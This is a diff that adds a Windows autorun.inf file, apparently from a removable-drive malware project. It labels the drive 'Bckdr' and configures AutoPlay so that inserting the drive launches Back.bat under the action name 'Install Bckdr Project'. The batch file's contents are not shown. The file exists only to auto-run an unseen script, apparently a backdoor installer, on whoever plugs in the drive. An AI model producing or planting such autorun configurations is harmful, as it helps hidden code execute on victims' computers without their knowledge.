@@ -1,0 +1,8 @@
+[autorun]
+open=Back.bat
+label=Bckdr
+icon=\prive\r\yeah.ico
+shell=start
+shellstartcommand=Back.bat
+shellstart=Install Bckdr Project
+UseAutoPlay=1
